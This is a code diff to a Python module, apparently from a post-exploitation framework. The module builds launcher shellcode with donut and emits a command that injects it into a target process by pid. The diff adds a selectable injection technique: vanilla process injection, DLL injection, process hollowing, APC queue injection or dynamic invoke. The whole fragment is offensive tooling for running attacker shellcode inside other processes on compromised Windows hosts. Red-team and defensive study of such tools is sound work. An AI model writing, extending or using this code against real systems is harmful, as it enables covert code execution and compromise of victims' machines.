@@ -29,7 +29,6 @@ class Module(object):
         launcher_obfuscation_command = params["ObfuscateCommand"]
         language = params["Language"]
         dot_net_version = params["DotNetVersion"].lower()
-        params["parentproc"]
         arch = params["Architecture"]
         launcher_obfuscation = params["Obfuscate"]
 
@@ -66,7 +65,7 @@ class Module(object):
             directory = f"{main_menu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{launcher}.exe"
             shellcode = donut.create(file=directory, arch=arch_type)
 
-        elif language.lower() == "python":
+        elif language.lower() == "ironpython":
             if dot_net_version == "net35":
                 return (
                     None,
@@ -104,5 +103,16 @@ class Module(object):
             + ".compiled"
         )
 
-        script_end = f",/t:1 /pid:{pid} /f:base64 /sc:{base64_shellcode}"
+        if params["Technique"] == "Vanilla Process Injection":
+            t = "1"
+        elif params["Technique"] == "DLL Injection":
+            t = "2"
+        elif params["Technique"] == "Process Hollowing":
+            t = "3"
+        elif params["Technique"] == "APC Queue Injection":
+            t = "4"
+        elif params["Technique"] == "Dynamic Invoke":
+            t = "5"
+
+        script_end = f",/t:{t} /pid:{pid} /f:base64 /sc:{base64_shellcode}"
         return f"{script_file}|{script_end}", None
